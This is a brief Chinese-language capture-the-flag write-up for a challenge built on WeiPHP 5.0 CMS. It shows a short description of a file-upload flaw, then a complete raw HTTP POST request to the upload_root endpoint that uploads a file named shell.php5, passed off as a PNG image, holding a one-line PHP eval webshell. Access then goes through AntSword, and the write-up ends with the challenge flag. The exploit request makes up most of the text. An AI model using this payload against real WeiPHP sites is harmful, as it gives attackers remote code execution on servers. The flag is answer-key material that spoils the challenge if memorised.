# weiphp

## 思路分析

> 打开链接,点击目录,跳转到一个后台登陆界面,知道是weiphp5.0 cms,百度搜索相关漏洞,发现存在文件上传漏洞,复现漏洞得到flag,上传的文件后缀是php5,蚁剑连接获取flag

## payload

```
POST /weiphp5.0/public/index.php/home/File/upload_root HTTP/1.1
Host: 61.147.171.105:55021
Content-Length: 854
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarymsLWqMwXraVpOdni
Accept: */*
Origin: http://61.147.171.105:55021
Referer: http://61.147.171.105:55021/weiphp5.0/public/index.php/home/file/upload_dialog/session_id/f4lv5b5c3n384rk9p180b9asm1/pbid/0
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: commodity_id="2|1:0|10:1683808918|12:commodity_id|8:MTYyNA==|11febe9bb1e0e93ad9a9298f3b09b7d18e5518bfaf0d594587b7139d3b51f4fc"; PHPSESSID=f4lv5b5c3n384rk9p180b9asm1; ScanLoginKey=6464c57e225b5
Connection: close

------WebKitFormBoundarymsLWqMwXraVpOdni
Content-Disposition: form-data; name="id"

WU_FILE_0
------WebKitFormBoundarymsLWqMwXraVpOdni
Content-Disposition: form-data; name="name"

0.png
------WebKitFormBoundarymsLWqMwXraVpOdni
Content-Disposition: form-data; name="type"

image/png
------WebKitFormBoundarymsLWqMwXraVpOdni
Content-Disposition: form-data; name="lastModifiedDate"

Mon Feb 27 2023 21:16:27 GMT+0800 (ä¸­å½æ åæ¶é´)
------WebKitFormBoundarymsLWqMwXraVpOdni
Content-Disposition: form-data; name="size"

41958
------WebKitFormBoundarymsLWqMwXraVpOdni
Content-Disposition: form-data; name="download"; filename="shell.php5"
Content-Type: image/png

RIFFÞ£  WEBPVP8 Ò£  °½*H'>m0G$#"!'t 
enü|Àÿ_þnñ k^êµ¢


¢Tqþ$ 
<?php eval(@$_POST['password']);?>
------WebKitFormBoundarymsLWqMwXraVpOdni--
```

## flag

> cyberpeace{88237eb5366bae09659af9bcff0a64c6}